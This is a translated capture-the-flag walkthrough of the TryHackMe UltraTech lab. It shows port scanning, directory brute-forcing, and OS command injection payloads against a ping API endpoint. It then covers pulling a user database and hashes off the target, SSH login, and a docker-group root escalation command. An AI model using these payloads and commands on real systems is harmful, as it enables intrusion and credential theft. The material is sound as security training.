<html>
<head>
<title>TryHackMe: UltraTech</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:超科技</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/tryhackme-ultratech-ce39a0640b49?source=collection_archive---------4-----------------------#2021-04-24">https://medium.com/nerd-for-tech/tryhackme-ultratech-ce39a0640b49?source=collection_archive---------4-----------------------#2021-04-24</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div class="er es if"><img src="../Images/16e4660abdacfe693b0c7f983c906a79.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/0*NPL4TT-9GtSVuJFt"/></div></figure><p id="1e02" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated"><a class="ae jk" href="https://tryhackme.com/room/ultratech1" rel="noopener ugc nofollow" target="_blank"> UltraTech </a>被列为中等房间，但感觉相当容易。该房间侧重于基本枚举、webapp 测试和权限提升。</p><p id="893f" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">那么，让我们开始吧！</p><h1 id="78f1" class="jl jm hi bd jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki bi translated">初始计数</h1><p id="e4d7" class="pw-post-body-paragraph im in hi io b ip kj ir is it kk iv iw ix kl iz ja jb km jd je jf kn jh ji jj hb bi translated">启动机器后，我们可以做的第一件事是尝试通过浏览器访问 IP 地址，以检查是否有网站托管在端口 80 或 443 上，但在这种情况下，我们无法通过端口 80/443 连接。这表明 80/443 端口很有可能被关闭。</p><p id="4609" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">在初始枚举中，我们可以做的下一件事是对提供的 IP 地址运行基本的<code class="du ko kp kq kr b">nmap</code>扫描。考虑到我们想要扫描所有端口，我们可以首先运行一个<code class="du ko kp kq kr b">TCP SYN</code>扫描来获得所有开放端口的列表，然后运行一个深度扫描，只关注开放端口。</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="279b" class="la jm hi kr b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$ sudo nmap -p- -sS 10.10.49.27 | tee open_ports<br/>[sudo] password for kali: <br/>Starting Nmap 7.91 ( <a class="ae jk" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021-04-23 10:45 EDT<br/>Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br/>SYN Stealth Scan Timing: About 6.51% done; ETC: 10:56 (0:10:17 remaining)<br/>Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br/>SYN Stealth Scan Timing: About 21.47% done; ETC: 10:59 (0:10:58 remaining)<br/>Nmap scan report for 10.10.49.27<br/>Host is up (0.15s latency).<br/>Not shown: 65531 closed ports<br/>PORT      STATE SERVICE<br/>21/tcp    open  ftp<br/>22/tcp    open  ssh<br/>8081/tcp  open  blackice-icecap<br/>31331/tcp open  unknown<br/>​<br/>Nmap done: 1 IP address (1 host up) scanned in 1078.39 seconds<br/>                                                                                                                     <br/>┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$ sudo nmap -sV -sC -A -O -T4 -p21,22,8081,31331 10.10.49.27 | tee service_scan<br/>[sudo] password for kali: <br/>Starting Nmap 7.91 ( <a class="ae jk" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021-04-23 11:15 EDT<br/>Nmap scan report for 10.10.49.27<br/>Host is up (0.16s latency).<br/>​<br/>PORT      STATE SERVICE VERSION<br/>21/tcp    open  ftp     vsftpd 3.0.3<br/>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)<br/>|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)<br/>|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)<br/>8081/tcp  open  http    Node.js Express framework<br/>|_http-cors: HEAD GET POST PUT DELETE<br/>|_http-title: Site doesn't have a title (text/html; charset=utf-8).<br/>31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)<br/>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br/>Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%), Linux 3.8 (92%)<br/>No exact OS matches for host (test conditions non-ideal).<br/>Network Distance: 2 hops<br/>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br/>​<br/>TRACEROUTE (using port 21/tcp)<br/>HOP RTT       ADDRESS<br/>1   163.70 ms 10.8.0.1<br/>2   164.16 ms 10.10.49.27<br/>​<br/>OS and Service detection performed. Please report any incorrect results at <a class="ae jk" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/>Nmap done: 1 IP address (1 host up) scanned in 30.91 seconds<br/>​</span></pre><p id="7363" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从这些结果中，我们可以看到 node.js 运行在端口 8081 上，Apache web server 运行在端口 31331 上。我们可以在我们的浏览器上访问和检查它们。</p><p id="7785" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">端口 8081 上的页面如下所示:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es lf"><img src="../Images/7cd4b14b2d201d1e2c852f39daafdd41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-RXxZ5-axvS0AD63uP9Aug.png"/></div></div></figure><p id="9dc4" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">在端口 31331 上，我们可以看到一个网页:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es lk"><img src="../Images/fdd9ecfe502117133e7ab7f677b11243.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tRrkt850yhzwu5XlARfPnQ.png"/></div></div></figure><p id="8da1" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">现在，我们可以继续在这两个端口上执行目录遍历攻击:</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="4a15" class="la jm hi kr b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$ dirb <a class="ae jk" href="http://10.10.49.27:8081" rel="noopener ugc nofollow" target="_blank">http://10.10.49.27:8081</a>                                                                         <br/>​<br/>-----------------<br/>DIRB v2.22    <br/>By The Dark Raver<br/>-----------------<br/>​<br/>START_TIME: Fri Apr 23 22:26:14 2021<br/>URL_BASE: <a class="ae jk" href="http://10.10.49.27:8081/" rel="noopener ugc nofollow" target="_blank">http://10.10.49.27:8081/</a><br/>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br/>​<br/>-----------------<br/>​<br/>GENERATED WORDS: 4612                                                          <br/>​<br/>---- Scanning URL: <a class="ae jk" href="http://10.10.49.27:8081/" rel="noopener ugc nofollow" target="_blank">http://10.10.49.27:8081/</a> ----<br/>+ <a class="ae jk" href="http://10.10.49.27:8081/auth" rel="noopener ugc nofollow" target="_blank">http://10.10.49.27:8081/auth</a> (CODE:200|SIZE:39)                                                                    <br/>+ <a class="ae jk" href="http://10.10.49.27:8081/ping" rel="noopener ugc nofollow" target="_blank">http://10.10.49.27:8081/ping</a> (CODE:500|SIZE:1094)                                                                  <br/>                                                                                                                     <br/>-----------------<br/>END_TIME: Fri Apr 23 22:40:31 2021<br/>DOWNLOADED: 4612 - FOUND: 2<br/>​</span></pre><p id="3883" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从上面的结果可以看出，<code class="du ko kp kq kr b">dirb</code>在端口 8081 上检测到了 2 个文件路径。</p><p id="5ccf" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">对于端口 31331，我们得到以下结果:</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="3a42" class="la jm hi kr b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$ ffuf -u <a class="ae jk" href="http://10.10.187.174:31337/FUZZ" rel="noopener ugc nofollow" target="_blank">http://10.10.187.174:31337/FUZZ</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br/>​<br/>        /'___\  /'___\           /'___\       <br/>       /\ \__/ /\ \__/  __  __  /\ \__/       <br/>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br/>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br/>         \ \_\   \ \_\  \ \____/  \ \_\       <br/>          \/_/    \/_/   \/___/    \/_/       <br/>​<br/>       v1.2.1<br/>________________________________________________<br/>​<br/> :: Method           : GET<br/> :: URL              : <a class="ae jk" href="http://10.10.187.174:31331/FUZZ" rel="noopener ugc nofollow" target="_blank">http://10.10.187.174:31331/FUZZ</a><br/> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br/> :: Follow redirects : false<br/> :: Calibration      : false<br/> :: Timeout          : 10<br/> :: Threads          : 40<br/> :: Matcher          : Response status: 200,204,301,302,307,401,403,405<br/>________________________________________________<br/>​<br/># directory-list-2.3-medium.txt [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/># Copyright 2007 James Fisher [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>                        [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/># on atleast 2 different hosts [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/># license, visit <a class="ae jk" href="http://creativecommons.org/licenses/by-sa/3.0/" rel="noopener ugc nofollow" target="_blank">http://creativecommons.org/licenses/by-sa/3.0/</a>  [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>css                     [Status: 301, Size: 321, Words: 20, Lines: 10]<br/># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>images                  [Status: 301, Size: 324, Words: 20, Lines: 10]<br/># This work is licensed under the Creative Commons  [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>js                      [Status: 301, Size: 320, Words: 20, Lines: 10]<br/>javascript              [Status: 301, Size: 328, Words: 20, Lines: 10]<br/>                        [Status: 200, Size: 6092, Words: 393, Lines: 140]<br/>server-status           [Status: 403, Size: 304, Words: 22, Lines: 12]<br/>:: Progress: [220560/220560] :: Job [1/1] :: 236 req/sec :: Duration: [0:22:27] :: Errors: 0 ::</span></pre><p id="a3e2" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">我们可以检查每个检测到的路径，发现在<code class="du ko kp kq kr b">js</code>目录中有一些有趣的文件。</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es ll"><img src="../Images/12bd14250143c1b50405fa1682119e81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*TpfZUFwIpakjGz1bMHIdig.png"/></div></figure><p id="61d7" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">在检查<code class="du ko kp kq kr b">api.js</code>档案时，我们可以发现一些真正有趣的信息。</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div class="er es lm"><img src="../Images/78a96eae9cfbe18a949134ef1912dfc5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/1*CVwC-ULfqO-gzeyQ0CX7wg.png"/></div></figure><p id="6116" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从 JS 文件中，可以推断出请求被发送到:<code class="du ko kp kq kr b">http://${getAPIURL()}/ping?ip=${window.location.hostname}</code>，其中函数<code class="du ko kp kq kr b">${getAPIURL()}</code>返回<code class="du ko kp kq kr b">${window.location.hostname}:8081</code>，它只不过是 web 主机的域名。在我们的例子中，我们可以尝试机器本身的 IP 地址。</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es ln"><img src="../Images/3872cfb5144e029a976904d0cd308045.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*brBO9vdRanBaa9DhTuIoHA.png"/></div></div></figure><blockquote class="lo lp lq"><p id="33d9" class="im in lr io b ip iq ir is it iu iv iw ls iy iz ja lt jc jd je lu jg jh ji jj hb bi translated"><em class="hi">正常输出无法正常显示，因此使用</em> <code class="du ko kp kq kr b"><em class="hi">view-source</em></code> <em class="hi">看起来更直观。</em></p></blockquote><h1 id="bd13" class="jl jm hi bd jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki bi translated">最初的立足点</h1><p id="35e5" class="pw-post-body-paragraph im in hi io b ip kj ir is it kk iv iw ix kl iz ja jb km jd je jf kn jh ji jj hb bi translated">我们可以看到<code class="du ko kp kq kr b">ping</code>命令正在后台运行。因此，我们可以尝试在这里执行操作系统命令注入。</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="1297" class="la jm hi kr b fi lb lc l ld le">view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93;ls # Does not work<br/>view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93|ls # Does not work<br/>view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93|`ls` # Works but only one word gets printed in the output</span></pre><p id="35b7" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从一个单词的输出中，我们可以看到一个<code class="du ko kp kq kr b">.sqlite</code>字段的名称被返回。</p><p id="69d7" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">我们知道命令正在机器上执行，但是我们看不到正确的输出。因此，我们可以通过执行以下步骤来尝试下载<code class="du ko kp kq kr b">.sqlite</code>文件以检查其内容:</p><ol class=""><li id="9335" class="lv lw hi io b ip iq it iu ix lx jb ly jf lz jj ma mb mc md bi translated">通过发送命令<code class="du ko kp kq kr b">which python</code>代替 URL 中的<code class="du ko kp kq kr b">ls</code>，检查<code class="du ko kp kq kr b">python</code>是否安装在机器上:</li></ol><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es me"><img src="../Images/13d6939f7870d00aefe099733820ee82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nXeEB7kvahAcVvmPZKAeDQ.png"/></div></div></figure><p id="f159" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">在这里，可以看到<code class="du ko kp kq kr b">/usr/bin/python</code>出现在机器上。</p><p id="062e" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">2.因此，我们可以通过发送命令<code class="du ko kp kq kr b">python -m SimpleHTTPServer</code>来启动一个 python 服务器，之后页面会一直加载，表明命令执行成功。</p><p id="b408" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">3.现在，我们可以在本地机器上使用<code class="du ko kp kq kr b">wget</code>从目标机器下载<code class="du ko kp kq kr b">.sqlite</code>文件:</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="f192" class="la jm hi kr b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$ wget <a class="ae jk" href="http://10.10.193.93:8000/utech.db.sqlite" rel="noopener ugc nofollow" target="_blank">http://10.10.193.93:8000/utech.db.sqlite</a><br/> — 2021–04–23 12:09:45 —  <a class="ae jk" href="http://10.10.193.93:8000/utech.db.sqlite" rel="noopener ugc nofollow" target="_blank">http://10.10.193.93:8000/utech.db.sqlite</a><br/>Connecting to 10.10.193.93:8000… connected.<br/>HTTP request sent, awaiting response… 200 OK<br/>Length: 8192 (8.0K) [application/octet-stream]<br/>Saving to: ‘utech.db.sqlite’<br/>​<br/>utech.db.sqlite 0%[ ] 0 — .-KB/s utech.db.sqlite 44%[===================&gt; ] 3.55K 10.4KB/s utech.db.sqlite 100%[==============================================&gt;] 8.00K 12.2KB/s utech.db.sqlite 100%[==============================================&gt;] 8.00K 12.2KB/s in 0.7s <br/>​<br/>2021–04–23 12:09:46 (12.2 KB/s) — ‘utech.db.sqlite’ saved [8192/8192]</span></pre><blockquote class="lo lp lq"><p id="caae" class="im in lr io b ip iq ir is it iu iv iw ls iy iz ja lt jc jd je lu jg jh ji jj hb bi translated">这里有一些猜测工作。通常 python 服务器在端口 8000 上启动，这就是我使用 8000 的原因，但是如果这个命令没有成功执行，我们可以尝试端口 8080 或者我们可以传递我们自己的特定端口。</p></blockquote><p id="97da" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">因为我们有了<code class="du ko kp kq kr b">.sqlite</code>文件，我们可以使用<code class="du ko kp kq kr b">sqlite3</code>命令打开它，并检查存储在其中的数据。</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="a610" class="la jm hi kr b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$ sqlite3 utech.db.sqlite <br/>SQLite version 3.34.1 2021-01-20 14:10:07<br/>Enter ".help" for usage hints.<br/>sqlite&gt; .database<br/>main: /home/kali/Desktop/oscp/ultraTech/utech.db.sqlite r/w<br/>sqlite&gt; .tables<br/>users<br/>sqlite&gt; select * from users<br/>   ...&gt; ;<br/>admin|0d0ea5111e3c1def594c1684e3b9be84|0<br/>r00t|f357a0c52799563c7c7b76c1e7543a32|0</span></pre><p id="a4d8" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从<code class="du ko kp kq kr b">.sqlite</code>文件中，我们能够获得两个用户的散列。我们可以尝试在<a class="ae jk" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">破解站</a>破解它们，并获得两个账户的密码。</p><p id="cd70" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">现在，我们有了一对用户名和密码，并且知道机器上的端口 22 是打开的。我们可以快速尝试 SSH 进入机器:</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="5c40" class="la jm hi kr b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]<br/>└─$                                                                                                     ssh r00t@10.10.187.174 <br/>The authenticity of host '10.10.187.174 (10.10.187.174)' can't be established.<br/>ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added '10.10.187.174' (ECDSA) to the list of known hosts.<br/>r00t@10.10.187.174's password: <br/>Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)<br/>​<br/> * Documentation:  <a class="ae jk" href="https://help.ubuntu.com" rel="noopener ugc nofollow" target="_blank">https://help.ubuntu.com</a><br/> * Management:     <a class="ae jk" href="https://landscape.canonical.com" rel="noopener ugc nofollow" target="_blank">https://landscape.canonical.com</a><br/> * Support:        <a class="ae jk" href="https://ubuntu.com/advantage" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/advantage</a><br/>​<br/>  System information as of Fri Apr 23 16:15:12 UTC 2021<br/>​<br/>  System load:  0.16               Processes:           105<br/>  Usage of /:   24.4% of 19.56GB   Users logged in:     0<br/>  Memory usage: 72%                IP address for eth0: 10.10.187.174<br/>  Swap usage:   0%<br/>​<br/>​<br/>1 package can be updated.<br/>0 updates are security updates.<br/>​<br/>​<br/>​<br/>The programs included with the Ubuntu system are free software;<br/>the exact distribution terms for each program are described in the<br/>individual files in /usr/share/doc/*/copyright.<br/>​<br/>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br/>applicable law.<br/>​<br/>r00t@ultratech-prod:~$ sudo -l<br/>[sudo] password for r00t: <br/>Sorry, user r00t may not run sudo on ultratech-prod.</span></pre><p id="6154" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">可以看到，使用用户“r00t”的凭据，我们可以访问该机器。此外，从<code class="du ko kp kq kr b">sudo -l</code>的输出可以清楚地看出，我们不能使用<code class="du ko kp kq kr b">sudo</code>特权运行任何命令。因此，我们可以做的下一件事是执行进一步的枚举，以找到任何可能的向量，通过它我们可以将我们的特权提升到<code class="du ko kp kq kr b">root</code>。</p><h1 id="5232" class="jl jm hi bd jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki bi translated">权限提升</h1><p id="8406" class="pw-post-body-paragraph im in hi io b ip kj ir is it kk iv iw ix kl iz ja jb km jd je jf kn jh ji jj hb bi translated">我们可以运行一些基本命令来获取关于系统和当前用户的信息:</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="b49e" class="la jm hi kr b fi lb lc l ld le">r00t@ultratech-prod:~$ whoami<br/>r00t<br/>r00t@ultratech-prod:~$ uname -a<br/>Linux ultratech-prod 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux<br/>r00t@ultratech-prod:~$ cat /proc/version<br/>Linux version 4.15.0-46-generic (buildd@lgw01-amd64-038) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019<br/>r00t@ultratech-prod:~$ id<br/>uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)</span></pre><p id="65d3" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">这里我们得到了执行权限提升的潜在向量，即用户在“docker”组中的存在。我们可以利用这一点将我们的权限提升到<code class="du ko kp kq kr b">root</code>，这只是一个简单的命令:</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="a347" class="la jm hi kr b fi lb lc l ld le">r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh<br/># whoami<br/>root<br/># cd root<br/># cd .ssh<br/># ls -la<br/>total 16<br/>drwx------ 2 root root 4096 Mar 22  2019 .<br/>drwx------ 6 root root 4096 Mar 22  2019 ..<br/>-rw------- 1 root root    0 Mar 19  2019 authorized_keys<br/>-rw------- 1 root root 1675 Mar 22  2019 id_rsa<br/>-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub<br/># cat id_rsa<br/>-----BEGIN RSA PRIVATE KEY-----</span></pre><p id="4fe2" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">因此，基本上<code class="du ko kp kq kr b">docker</code>命令可以分解为:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es mf"><img src="../Images/1ab0f2ee5c2b6d27db530d61e267e059.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aGEiK_4vwff3hWLebbFvfA.png"/></div></div></figure><p id="af95" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">有了这个，我们就有了超级科技机器！</p><h1 id="5e75" class="jl jm hi bd jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki bi translated">替代方法</h1><p id="7d5e" class="pw-post-body-paragraph im in hi io b ip kj ir is it kk iv iw ix kl iz ja jb km jd je jf kn jh ji jj hb bi translated">执行操作系统命令注入的更好方法是使用关键字<code class="du ko kp kq kr b">%0a </code>(换行符):</p><pre class="ks kt ku kv fd kw kr kx ky aw kz bi"><span id="5fcb" class="la jm hi kr b fi lb lc l ld le">view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93 %0a ls -la</span></pre><p id="d6e3" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">这将产生如下输出:</p><figure class="ks kt ku kv fd ij er es paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="er es mg"><img src="../Images/1e56cf3a2d6daf3d93a758c9871c6961.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H4gDCzeog9tmFQmXEAvYVQ.png"/></div></div></figure><h1 id="ff25" class="jl jm hi bd jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki bi translated">资源</h1><ol class=""><li id="f358" class="lv lw hi io b ip kj it kk ix mh jb mi jf mj jj ma mb mc md bi translated">TryHackMe—UltraTech:<a class="ae jk" href="https://tryhackme.com/room/ultratech1" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/ultratech1</a></li><li id="fdd6" class="lv lw hi io b ip mk it ml ix mm jb mn jf mo jj ma mb mc md bi translated">巴斯拉·德米尔编写的 Pentester 命令注入指南:<a class="ae jk" href="https://blog.cobalt.io/a-pentesters-guide-to-command-injection-df2657c8c1ad" rel="noopener ugc nofollow" target="_blank">https://blog . cobalt . io/a-pentesters-Guide-to-Command-Injection-df 2657 c 8 C1 ad</a></li><li id="a81e" class="lv lw hi io b ip mk it ml ix mm jb mn jf mo jj ma mb mc md bi translated">Docker 权限提升:<a class="ae jk" href="https://keiran.scot/privilege-escallation-with-docker-56dc682a6e17" rel="noopener ugc nofollow" target="_blank">https://keiran . scot/Privilege-Escalation-with-docker-56dc 682 a6 e 17</a></li></ol></div><div class="ab cl mp mq gp mr" role="separator"><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu"/></div><div class="hb hc hd he hf"><p id="c245" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">一定要看看我在 https://github.com/0xNirvana<a class="ae jk" href="https://github.com/0xNirvana" rel="noopener ugc nofollow" target="_blank">的其他作品和评论</a></p></div></div>    
</body>
</html>